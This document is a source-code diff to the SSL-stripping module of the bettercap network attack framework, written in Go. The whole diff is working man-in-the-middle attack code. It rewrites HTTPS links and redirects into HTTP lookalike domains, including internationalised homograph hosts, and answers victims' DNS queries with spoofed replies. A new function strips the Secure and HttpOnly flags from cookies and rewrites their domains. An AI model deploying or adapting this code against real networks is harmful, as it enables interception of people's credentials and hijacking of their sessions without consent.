@@ -1,9 +1,7 @@
 package http_proxy
 
 import (
-	"fmt"
 	"io/ioutil"
-	"net"
 	"net/http"
 	"net/url"
 	"regexp"
@@ -11,8 +9,8 @@ import (
 	"strconv"
 
 	"github.com/bettercap/bettercap/log"
-	"github.com/bettercap/bettercap/packets"
 	"github.com/bettercap/bettercap/session"
+	"github.com/bettercap/bettercap/modules/dns_spoof"
 
 	"github.com/elazarl/goproxy"
 	"github.com/google/gopacket"
@@ -20,122 +18,41 @@ import (
 	"github.com/google/gopacket/pcap"
 
 	"github.com/evilsocket/islazy/tui"
+
+	"golang.org/x/net/idna"
 )
 
 var (
-	maxRedirs        = 5
 	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
-	subdomains       = map[string]string{
-		"www":     "wwwww",
-		"webmail": "wwebmail",
-		"mail":    "wmail",
-		"m":       "wmobile",
-	}
+	domainCookieParser = regexp.MustCompile(`; ?(?i)domain=.*(;|$)`)
+	flagsCookieParser = regexp.MustCompile(`; ?(?i)(secure|httponly)`)
 )
 
 type SSLStripper struct {
 	enabled       bool
+	useIDN        bool
 	session       *session.Session
 	cookies       *CookieTracker
 	hosts         *HostTracker
 	handle        *pcap.Handle
 	pktSourceChan chan gopacket.Packet
-	redirs        map[string]int
 }
 
-func NewSSLStripper(s *session.Session, enabled bool) *SSLStripper {
+func NewSSLStripper(s *session.Session, enabled bool, useIDN bool) *SSLStripper {
 	strip := &SSLStripper{
 		enabled: false,
+		useIDN: false,
 		cookies: NewCookieTracker(),
 		hosts:   NewHostTracker(),
 		session: s,
 		handle:  nil,
-		redirs:  make(map[string]int),
 	}
-	strip.Enable(enabled)
+	strip.Enable(enabled, useIDN)
 	return strip
 }
 
 func (s *SSLStripper) Enabled() bool {
 	return s.enabled
-}
-
-func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {
-	redir := fmt.Sprintf("(->%s)", address)
-	who := target.String()
-
-	if t, found := s.session.Lan.Get(target.String()); found {
-		who = t.String()
-	}
-
-	log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", tui.Green("dns"), tui.Red(domain), tui.Dim(redir), tui.Bold(who))
-
-	var err error
-	var src, dst net.IP
-
-	nlayer := pkt.NetworkLayer()
-	if nlayer == nil {
-		log.Debug("Missing network layer skipping packet.")
-		return
-	}
-
-	pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
-	src = pip.DstIP
-	dst = pip.SrcIP
-
-	eth := layers.Ethernet{
-		SrcMAC:       peth.DstMAC,
-		DstMAC:       target,
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-
-	answers := make([]layers.DNSResourceRecord, 0)
-	for _, q := range req.Questions {
-		answers = append(answers,
-			layers.DNSResourceRecord{
-				Name:  []byte(q.Name),
-				Type:  q.Type,
-				Class: q.Class,
-				TTL:   1024,
-				IP:    address,
-			})
-	}
-
-	dns := layers.DNS{
-		ID:        req.ID,
-		QR:        true,
-		OpCode:    layers.DNSOpCodeQuery,
-		QDCount:   req.QDCount,
-		Questions: req.Questions,
-		Answers:   answers,
-	}
-
-	ip4 := layers.IPv4{
-		Protocol: layers.IPProtocolUDP,
-		Version:  4,
-		TTL:      64,
-		SrcIP:    src,
-		DstIP:    dst,
-	}
-
-	udp := layers.UDP{
-		SrcPort: pudp.DstPort,
-		DstPort: pudp.SrcPort,
-	}
-
-	udp.SetNetworkLayerForChecksum(&ip4)
-
-	var raw []byte
-	err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
-	if err != nil {
-		log.Error("Error serializing packet: %s.", err)
-		return
-	}
-
-	log.Debug("Sending %d bytes of packet ...", len(raw))
-	if err := s.session.Queue.Send(raw); err != nil {
-		log.Error("Error sending packet: %s", err)
-	}
 }
 
 func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
@@ -153,14 +70,18 @@ func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
 			domain := string(q.Name)
 			original := s.hosts.Unstrip(domain)
 			if original != nil && original.Address != nil {
-				s.dnsReply(pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
+				redir, who := dns_spoof.DnsReply(s.session, 1024, pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
+				if redir != "" && who != "" {
+					log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", tui.Green("dns"), tui.Red(domain), tui.Dim(redir), tui.Bold(who))
+				}
 			}
 		}
 	}
 }
 
-func (s *SSLStripper) Enable(enabled bool) {
+func (s *SSLStripper) Enable(enabled bool, useIDN bool) {
 	s.enabled = enabled
+	s.useIDN = useIDN
 
 	if enabled && s.handle == nil {
 		var err error
@@ -208,23 +129,28 @@ func (s *SSLStripper) isContentStrippable(res *http.Response) bool {
 
 func (s *SSLStripper) processURL(url string) string {
 	// first we remove the https schema
-	url = strings.Replace(url, "https://", "http://", 1)
+	url = url[8:]
 
-	// search for a known subdomain and replace it
-	found := false
-	for sub, repl := range subdomains {
-		what := fmt.Sprintf("://%s", sub)
-		with := fmt.Sprintf("://%s", repl)
-		if strings.Contains(url, what) {
-			url = strings.Replace(url, what, with, 1)
-			found = true
-			break
-		}
+	// search the first instance of "/"
+	iEndHost := strings.Index(url, "/")
+	if iEndHost == -1 {
+			iEndHost = len(url)
 	}
-	// fallback
-	if !found {
-		url = strings.Replace(url, "://", "://wwww.", 1)
+	// search if port is specified
+	iPort := strings.Index(url[:iEndHost], ":")
+	if iPort == -1 {
+			iPort = iEndHost
 	}
+	if s.useIDN {
+		// add an international character to the domain name & strip HTTPS port (if any)
+		url = url[:iPort] + "ノ" + url[iEndHost:]
+	} else {
+		// double the last TLD's character & strip HTTPS port (if any)
+		url = url[:iPort] + string(url[iPort-1]) + url[iEndHost:]
+	}
+
+	// finally we add the http schema
+	url = "http://" + url
 
 	return url
 }
@@ -238,19 +164,14 @@ func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redi
 		return
 	}
 
-	// well ...
-	if req.URL.Scheme == "https" {
-		// TODO: check for max redirects?
-		req.URL.Scheme = "http"
-	}
-
 	// handle stripped domains
 	original := s.hosts.Unstrip(req.Host)
 	if original != nil {
-		log.Info("[%s] Replacing host %s with %s in request from %s", tui.Green("sslstrip"), tui.Bold(req.Host), tui.Yellow(original.Hostname), req.RemoteAddr)
+		log.Info("[%s] Replacing host %s with %s in request from %s and transmitting HTTPS", tui.Green("sslstrip"), tui.Bold(req.Host), tui.Yellow(original.Hostname), req.RemoteAddr)
 		req.Host = original.Hostname
 		req.URL.Host = original.Hostname
 		req.Header.Set("Host", original.Hostname)
+		req.URL.Scheme = "https"
 	}
 
 	if !s.cookies.IsClean(req) {
@@ -264,24 +185,30 @@ func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redi
 	return
 }
 
-func (s *SSLStripper) isMaxRedirs(hostname string) bool {
-	// did we already track redirections for this host?
-	if nredirs, found := s.redirs[hostname]; found {
-		// reached the threshold?
-		if nredirs >= maxRedirs {
-			log.Warning("[%s] Hit max redirections for %s, serving HTTPS.", tui.Green("sslstrip"), hostname)
-			// reset
-			delete(s.redirs, hostname)
-			return true
-		} else {
-			// increment
-			s.redirs[hostname]++
+func (s *SSLStripper) fixCookies(res *http.Response) {
+	origHost := res.Request.URL.Hostname()
+	strippedHost := s.hosts.Strip(origHost)
+
+	if strippedHost != nil && strippedHost.Hostname != origHost && res.Header["Set-Cookie"] != nil {
+		// get domains from hostnames
+		if origParts, strippedParts := strings.Split(origHost, "."), strings.Split(strippedHost.Hostname, "."); len(origParts) > 1 && len(strippedParts) > 1 {
+			origDomain := origParts[len(origParts)-2] + "." + origParts[len(origParts)-1]
+			strippedDomain := strippedParts[len(strippedParts)-2] + "." + strippedParts[len(strippedParts)-1]
+
+			log.Info("[%s] Fixing cookies on %s", tui.Green("sslstrip"),tui.Bold(strippedHost.Hostname))
+			cookies := make([]string, len(res.Header["Set-Cookie"]))
+			// replace domain and strip "secure" flag for each cookie
+			for i, cookie := range res.Header["Set-Cookie"] {
+				domainIndex := domainCookieParser.FindStringIndex(cookie)
+				if domainIndex != nil {
+					cookie = cookie[:domainIndex[0]] + strings.Replace(cookie[domainIndex[0]:domainIndex[1]], origDomain, strippedDomain, 1) + cookie[domainIndex[1]:]
+				}
+				cookies[i] = flagsCookieParser.ReplaceAllString(cookie, "")
+			}
+			res.Header["Set-Cookie"] = cookies
+			s.cookies.Track(res.Request)
 		}
-	} else {
-		// start tracking redirections
-		s.redirs[hostname] = 1
 	}
-	return false
 }
 
 func (s *SSLStripper) fixResponseHeaders(res *http.Response) {
@@ -310,12 +237,13 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 
 	s.fixResponseHeaders(res)
 
+	orig := res.Request.URL
+	origHost := orig.Hostname()
+
 	// is the server redirecting us?
 	if res.StatusCode != 200 {
 		// extract Location header
 		if location, err := res.Location(); location != nil && err == nil {
-			orig := res.Request.URL
-			origHost := orig.Hostname()
 			newHost := location.Host
 			newURL := location.String()
 
@@ -324,17 +252,14 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 
 				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))
 
-				// if we still did not reach max redirections, strip the URL down to
-				// an alternative HTTP version
-				if !s.isMaxRedirs(origHost) {
-					strippedURL := s.processURL(newURL)
-					u, _ := url.Parse(strippedURL)
-					hostStripped := u.Hostname()
+				// strip the URL down to an alternative HTTP version and save it to an ASCII Internationalized Domain Name
+				strippedURL := s.processURL(newURL)
+				parsed, _ := url.Parse(strippedURL)
+				hostStripped := parsed.Hostname()
+				hostStripped, _ = idna.ToASCII(hostStripped)
+				s.hosts.Track(newHost, hostStripped)
 
-					s.hosts.Track(origHost, hostStripped)
-
-					res.Header.Set("Location", strippedURL)
-				}
+				res.Header.Set("Location", strippedURL)
 			}
 		}
 	}
@@ -352,9 +277,9 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 		urls := make(map[string]string)
 		matches := httpsLinksParser.FindAllString(body, -1)
 		for _, u := range matches {
-			// make sure we only strip stuff we're able to
-			// resolve and process
-			if strings.ContainsRune(u, '.') {
+			// make sure we only strip valid URLs
+			if parsed, _ := url.Parse(u); parsed != nil {
+				// strip the URL down to an alternative HTTP version
 				urls[u] = s.processURL(u)
 			}
 		}
@@ -368,17 +293,24 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 			log.Info("[%s] Stripping %d SSL link%s from %s", tui.Green("sslstrip"), nurls, plural, tui.Bold(res.Request.Host))
 		}
 
-		for url, stripped := range urls {
-			log.Debug("Stripping url %s to %s", tui.Bold(url), tui.Yellow(stripped))
+		for u, stripped := range urls {
+			log.Debug("Stripping url %s to %s", tui.Bold(u), tui.Yellow(stripped))
 
-			body = strings.Replace(body, url, stripped, -1)
+			body = strings.Replace(body, u, stripped, -1)
 
-			hostOriginal := strings.Replace(url, "https://", "", 1)
-			hostStripped := strings.Replace(stripped, "http://", "", 1)
+			// save stripped host to an ASCII Internationalized Domain Name
+			parsed, _ := url.Parse(u)
+			hostOriginal := parsed.Hostname()
+			parsed, _ = url.Parse(stripped)
+			hostStripped := parsed.Hostname()
+			hostStripped, _ = idna.ToASCII(hostStripped)
 			s.hosts.Track(hostOriginal, hostStripped)
 		}
 
 		res.Header.Set("Content-Length", strconv.Itoa(len(body)))
+
+		// fix cookies domain + strip "secure" + "httponly" flags
+		s.fixCookies(res)
 
 		// reset the response body to the original unread state
 		// but with just a string reader, this way further calls
